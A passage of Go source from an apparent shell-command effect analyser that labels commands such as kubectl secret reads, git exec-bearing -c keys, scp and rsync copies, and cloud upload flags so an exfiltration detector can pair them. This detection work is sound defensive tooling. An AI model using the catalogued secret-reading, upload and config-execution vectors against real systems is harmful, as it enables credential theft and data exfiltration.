		Kind:       c.kind,
		Target:     target,
		Mode:       engine.ModeDirect,
		Certainty:  engine.CertaintyCertain,
		Taint:      taint,
		Reversible: c.kind == engine.KindFSRead,
	}
	atoms := []engine.Atom{cmdAtom, operandAtom(sc.Value, sc.Pos)}
	if c.arg != "" {
		atoms = append(atoms, engine.Atom{Kind: engine.AtomLiteral, Text: c.arg, Loc: locPtr(sc.Pos)})
	}
	return e, derive(e, atoms, ruleForKind(c.kind))
}

// declaresOperationSlot reports whether cmd declares a positional parameter
// whose slot carries an operation (a subcommand, a target, an archive sink): the
// slot the intrinsic ProcSpawn fallback is keyed on (Finding 65).
func declaresOperationSlot(cmd *kb.Command) bool {
	if cmd == nil {
		return false
	}
	for _, p := range cmd.Params {
		if operationParam(p) {
			return true
		}
	}
	return false
}

// localPathLabels are final labels that name a local artefact, not a remote:
// a repository directory (`repo.git`, `backup.repo`) and the ordinary file
// extensions a pathspec carries. A network subcommand's operand with one of
// them is a local path, so it names no destination.
var localPathLabels = map[string]bool{
	"git": true, "repo": true, "svn": true, "hg": true, "bzr": true,
	"darcs": true, "fossil": true,
	"md": true, "txt": true, "diff": true, "patch": true, "log": true,
	"json": true, "yaml": true, "yml": true, "xml": true, "html": true,
	"css": true, "js": true, "ts": true, "tsx": true, "jsx": true,
	"go": true, "py": true, "rb": true, "rs": true, "java": true,
	"png": true, "jpg": true, "jpeg": true, "gif": true, "svg": true,
	"pdf": true, "gz": true, "zip": true, "tar": true, "tgz": true,
	"tmp": true, "bak": true, "old": true, "conf": true, "ini": true,
	"env": true, "lock": true, "mod": true, "sum": true, "csv": true,
	"sql": true, "db": true, "pem": true, "key": true, "crt": true,
	"bin": true, "exe": true, "so": true, "dylib": true, "out": true,
	"sh": true,
	// package archives and installable artefacts: `pip install x.whl`,
	// `dpkg -i x.deb` and `gem install x.gem` name local files, not remotes.
	"whl": true, "deb": true, "rpm": true, "apk": true, "jar": true,
	"gem": true, "nupkg": true, "crate": true, "egg": true, "msi": true,
	"dmg": true, "pkg": true, "iso": true, "img": true, "war": true,
	"ear": true, "aar": true, "wasm": true, "o": true, "a": true,
}

// paramDeclaresEgress reports whether the parameter declares a network egress
// in either its primary effect or its secondary list. The value is used to
// decide whether an operand group's first remote name may stand in as the
// egress target when the host grammar rejects it (Finding 14); a secondary
// NetEgress needs the same treatment as a primary one, or `pip install pkg`
// would lose the registry fetch the row now declares.
func paramDeclaresEgress(p kb.Param) bool {
	if p.Effect.Kind == engine.KindNetEgress {
		return true
	}
	for _, e := range p.Also {
		if e.Kind == engine.KindNetEgress {
			return true
		}
	}
	return false
}

// namesRemote reports whether an egress target names something that can be a
// remote: a host/URL the grammar accepted, an unresolved (top) destination, or
// a bare remote/package name. It rejects the two shapes that make a secondary
// egress a fabrication — no target at all (bottom), and a target that is a
// local artefact (`pip install requests.whl`, `pip install ./pkg`), which a
// package-manager row's *primary* write already reports.
func namesRemote(s engine.Scope) bool {
	if s.IsTop() {
		return true
	}
	ts := s.Targets()
	if len(ts) == 0 {
		return false
	}
	for _, t := range ts {
		if remoteCoordinateShaped(t) {
			return true
		}
	}
	return false
}

// remoteCoordinateShaped reports whether a token can name a registry
// coordinate: a package name, a scoped name (`@scope/pkg`) or a composer-style
// `vendor/package`. It rejects the shapes that can only name a local path — a
// leading separator, `./`, `../`, `~` or a drive letter, and a final label that
// names a local artefact (`requests.whl`, `x.deb`, `repo.git`).
func remoteCoordinateShaped(s string) bool {
	if s == "" || s == "." || s == ".." {
		return false
	}
	switch {
	case strings.HasPrefix(s, "/"), strings.HasPrefix(s, "./"),
		strings.HasPrefix(s, "../"), strings.HasPrefix(s, "~"),
		strings.HasPrefix(s, "-"), strings.HasPrefix(s, "\\"):
		return false
	}
	if len(s) > 1 && s[1] == ':' {
		return false // a Windows drive letter
	}
	// A colon can only introduce an scp-style remote or a drive/URL, both of
	// which the host grammar either accepts as a destination or rejects for a
	// reason of its own; it is never part of a bare registry coordinate.
	if strings.ContainsRune(s, ':') {
		return false
	}
	// `@` at position 0 is an npm scope (`@scope/pkg`); anywhere else it is
	// userinfo (`user@host`) or a pathspec like `foo/bar@baz.com`, neither of
	// which is a package name.
	if strings.IndexByte(s, '@') > 0 {
		return false
	}
	if i := strings.LastIndexByte(s, '.'); i > 0 && localPathLabels[strings.ToLower(s[i+1:])] {
		return false
	}
	return true
}

// firstRemoteOperand returns the group's first operand that names a remote
// (host-shaped, or a bare remote/package name), in command-line order.
func firstRemoteOperand(g []Arg) string {
	for _, a := range g {
		if !a.Literal || a.Value == "" {
			continue
		}
		if remoteCoordinateShaped(a.Value) {
			return a.Value
		}
	}
	return ""
}

// uploadSourceFlagSpecs returns the option specs whose value is the local
// payload of an upload whose source is not a positional operand (`az storage
// blob upload -f FILE`).
func uploadSourceFlagSpecs(cmd *kb.Command, ops []Arg) map[string]bool {
	if cmd == nil || len(ops) < 2 {
		return nil
	}
	word := func(i int) string {
		if i >= len(ops) || !ops[i].Literal {
			return ""
		}
		return ops[i].Value
	}
	switch cmd.Name {
	case "aws":
		// aws s3api put-object --body FILE
		if word(0) == "s3api" && word(1) == "put-object" {
			return map[string]bool{"--body": true}
		}
	case "az":
		// az storage blob upload -f FILE
		if word(0) == "storage" && word(1) == "blob" && word(2) == "upload" {
			return map[string]bool{"-f": true, "--file": true}
		}
	case "git":
		// git send-email --attach FILE
		if word(0) == "send-email" {
			return map[string]bool{"--attach": true}
		}
	}
	return nil
}

// ---------------------------------------------------------------------------
// Finding 3: a copy client's local destination is the write it performs
// ---------------------------------------------------------------------------

// copyClientDestSpec names, per copy client, the positional that says where the
// copy lands. The rows declare it `NetEgress` because `[user@]host:path` is an
// upload; the egress gate then drops a destination that is not host-shaped, and
// for a purely local copy that dropped operand is exactly the file the client
// creates — the FSWrite `cp DEST` reports.
var copyClientDestSpec = map[string]string{
	"scp":   "DEST",
	"rsync": "DEST",
}

// isCopyClientDest reports whether p is the destination positional of a copy
// client (scp, rsync).
func isCopyClientDest(cmd *kb.Command, p kb.Param) bool {
	if cmd == nil {
		return false
	}
	spec, ok := copyClientDestSpec[cmd.Name]
	return ok && p.Kind == kb.ParamPositional && p.Spec == spec
}

// localCopyDestWrite is the effect a copy client's non-host-shaped destination
// carries (Finding 3): a local FSWrite, parity with the `cp DEST` spelling.
// The egress gate established that the operand names no host, so this is never
// a fabricated remote destination, and the target is the operand scope the gate
// received (⊤ only when the operand itself is unresolved).
func localCopyDestWrite(target engine.Scope, taint engine.Taint, cert engine.Certainty) engine.Effect {
	return engine.Effect{
		Kind:       engine.KindFSWrite,
		Target:     target,
		Mode:       engine.ModeDirect,
		Certainty:  cert,
		Taint:      taint,
		Reversible: false,
	}
}

// copyDestIsRemote reports whether a copy client's destination operand is
// spelled as a remote one (Finding 3). scp and rsync name a remote as
// `[user@]host:path`, `host::module` or an `rsync://` URL; a destination without
// that colon is a local path — whatever the lenient host grammar makes of a bare
// name — and an unresolved (⊤) destination cannot be proven local, so it keeps
// the egress it declared.
func copyDestIsRemote(target engine.Scope) bool {
	if target.IsTop() {
		return true
	}
	targets := target.Targets()
	if len(targets) == 0 {
		return true
	}
	for _, t := range targets {
		if strings.Contains(t, ":") {
			return true
		}
	}
	return false
}

// ---------------------------------------------------------------------------
// Finding 52: the secret-returning subcommand of a container client
// ---------------------------------------------------------------------------

// isSecretResourceWord reports whether res names Kubernetes secret objects:
// `secret`, `secrets` and the `secret/NAME` spelling kubectl also accepts.
func isSecretResourceWord(res string) bool {
	r := strings.ToLower(res)
	if i := strings.IndexByte(r, '/'); i >= 0 {
		r = r[:i]
	}
	return r == "secret" || r == "secrets"
}

// secretSubcommandRead is the CredAccess a container client's secret-returning
// subcommand performs (Finding 52). `kubectl get|describe secret…` and
// `helm get values|all` print secret material to stdout, so the subcommand is a
// credential source — the same effect the rows already declare for their
// identity subcommands (`kubectl auth`, `helm registry login`). Without it the
// pipeline's stdout carries no secret and the exfiltration detector pairs
// nothing.
func secretSubcommandRead(cmd *kb.Command, p kb.Param, group []Arg) (engine.Effect, bool) {
	if cmd == nil || len(group) == 0 || !group[0].Literal {
		return engine.Effect{}, false
	}
	res := group[0].Value
	ok := false
	switch cmd.Name {
	case "kubectl":
		// kubectl get secret [NAME], kubectl describe secret [NAME]
		if p.Spec == "get" || p.Spec == "describe" {
			ok = isSecretResourceWord(res)
		}
	case "helm":
		// helm get values REL, helm get all REL
		if p.Spec == "get" {
			ok = res == "values" || res == "all"
		}
	}
	if !ok {
		return engine.Effect{}, false
	}
	return engine.Effect{
		Kind:       engine.KindCredAccess,
		Target:     engine.ScopeOf(res),
		Mode:       engine.ModeDirect,
		Certainty:  engine.CertaintyCertain,
		Taint:      engine.TaintBottom(),
		Reversible: kb.DefaultReversible(engine.KindCredAccess),
	}, true
}

// ---------------------------------------------------------------------------
// Finding 66: tar's -C/--directory is mode-dependent
// ---------------------------------------------------------------------------

// tarCreateBaseDirRead is the read a `tar -C DIR` performs in CREATE mode
// (Finding 66). `tar czf - -C DIR .` changes to DIR and archives its contents,
// so the option names a recursive read of DIR — not a write to it. In extract
// mode the same option is the write root and the row's declared FSWrite stands,
// so this helper only fires for a create-mode invocation.
func tarCreateBaseDirRead(cmd *kb.Command, spec string, value Arg, create bool) (engine.Effect, bool) {
	if cmd == nil || cmd.Dialect != kb.DialectTar || !create {
		return engine.Effect{}, false
	}
	if spec != "-C" && spec != "--directory" {
		return engine.Effect{}, false
	}
	target := engine.ScopeTop()
	if value.Literal && value.Value != "" {
		target = engine.ScopeOf(value.Value)
	}
	return engine.Effect{
		Kind:       engine.KindFSRead,
		Target:     target,
		Mode:       engine.ModeDirect,
		Certainty:  engine.CertaintyCertain,
		Taint:      engine.TaintBottom(),
		Reversible: true,
	}, true
}

// tarCreates reports whether the matched parameters select tar's create mode
// (`-c`/`--create`, including the POSIX first-argument bundle `tar czf …`).
func tarCreates(cmd *kb.Command, matches []match, operands []Arg) bool {
	if cmd == nil || cmd.Dialect != kb.DialectTar {
		return false
	}
	for _, m := range matches {
		if m.param.Spec == "-c" || m.param.Spec == "--create" {
			return true
		}
	}
	// The POSIX first-argument bundle spelling (`tar czf - -C DIR .`): the row
	// declares `czf`/`cf`/`c` as positional modes, so create mode is the
	// leading operand's letter set rather than a dashed flag.
	if len(operands) > 0 && operands[0].Literal {
		return tarCreateBundle(operands[0].Value)
	}
	return false
}

// tarCreateBundle reports whether a bundled first argument selects create mode:
// its letters include `c` and none of tar's other operation letters (x extract,
// t list, r append, u update, A concatenate, d diff). Modifier letters (z, j,
// v, f, p, P, a, …) are ignored, exactly as tar reads them.
func tarCreateBundle(spec string) bool {
	if spec == "" || strings.HasPrefix(spec, "-") || len(spec) > 8 {
		return false
	}
	create := false
	for _, r := range spec {
		switch r {
		case 'c':
			create = true
		case 'x', 't', 'r', 'u', 'A', 'd':
			return false
		}
	}
	return create
}

// ---------------------------------------------------------------------------
// Finding 29: git's exec-bearing -c configuration keys
// ---------------------------------------------------------------------------

// gitConfigExecKey reports whether a `git -c key=value` assignment names a
// configuration key whose value git runs through a shell (Finding 29). `man
// git-config` documents each one as a command line: core.pager is "interpreted
// by the shell", core.sshCommand/core.editor/core.fsmonitor are programs, an
// alias may be a `!` shell command, diff drivers carry `command`/`textconv`,
// filter drivers carry `clean`/`smudge`, and `include.path` pulls in a file
// whose own values apply. The returned text is the value, i.e. the command the
// key runs.
func gitConfigExecKey(cmd *kb.Command, spec string, value Arg) (string, bool) {
	if cmd == nil || cmd.Name != "git" || spec != "-c" || !value.Literal {
		return "", false
	}
	key, val, ok := strings.Cut(value.Value, "=")
	if !ok {
		return "", false
	}
	if !execBearingConfigKey(strings.ToLower(strings.TrimSpace(key))) {
		return "", false
	}
	return val, true
}

// execBearingConfigKey is the key vocabulary of gitConfigExecKey. Keys are
// case-insensitive, and the section/name wildcards are matched structurally so
// `alias.x`, `diff.mydriver.command` and `filter.lfs.clean` all qualify.
func execBearingConfigKey(k string) bool {
	if strings.HasPrefix(k, "alias.") && len(k) > len("alias.") {
		return true
	}
	if strings.HasPrefix(k, "diff.") && (strings.HasSuffix(k, ".command") || strings.HasSuffix(k, ".textconv")) {
		return true
	}
	if strings.HasPrefix(k, "filter.") && (strings.HasSuffix(k, ".clean") || strings.HasSuffix(k, ".smudge")) {
		return true
	}
	switch k {
	case "core.pager", "core.sshcommand", "core.editor", "core.fsmonitor",
		"core.hookspath", "include.path":
		return true
	}
	return false
}

// ---------------------------------------------------------------------------
// Finding 18: `ip`'s two-word verb spelling
// ---------------------------------------------------------------------------

// ipMutationVerbs are the `ip` verbs that rewrite local kernel network state
// (a route, an address, a link flag). They outlive the invocation, so they are
// Persist, never NetIngress: nothing here receives inbound traffic.
var ipMutationVerbs = map[string]bool{
	"add": true, "del": true, "delete": true, "set": true,
	"flush": true, "change": true, "replace": true,
}

// ipVerbParam resolves the verb that follows `ip`'s object word (Finding 18).
// The binder matches a positional by value only for the FIRST operand, so in
// `ip route add …` the object word binds and the verb never does; the row's
// Persist declaration is then unreachable and the mutation reports the object's
// read. The verb is bound here as the second operand of the same phrase — and
// only when the row declares it Persist, so `ip route show`/`ip addr`/`ip link`
// stay read-only and a new verb cannot be invented by the binder.
func ipVerbParam(cmd *kb.Command, object kb.Param, group []Arg) (kb.Param, []Arg, bool) {
	if cmd == nil || cmd.Name != "ip" || object.Effect.Kind != engine.KindFSRead {
		return kb.Param{}, nil, false
	}
	if len(group) == 0 || !group[0].Literal || !ipMutationVerbs[group[0].Value] {
		return kb.Param{}, nil, false
	}
	for _, p := range positionalParams(cmd) {
		if p.Spec == group[0].Value && p.Effect.Kind == engine.KindPersist {
			return p, group[1:], true
		}
	}
	return kb.Param{}, nil, false
}

// codeTextEffect builds the CodeExec for a command text an option supplies and
// the client runs (git -c core.pager=CMD). An unbound text widens the target to
// ⊤ — the execution is certain, its subject is not.
func codeTextEffect(text string) engine.Effect {
	target := engine.ScopeTop()
	if text != "" {
		target = engine.ScopeOf(text)
	}
	return engine.Effect{
		Kind:       engine.KindCodeExec,
		Target:     target,
		Mode:       engine.ModeDirect,
		Certainty:  engine.CertaintyCertain,
		Taint:      engine.TaintBottom(),
		Reversible: false,
	}
}
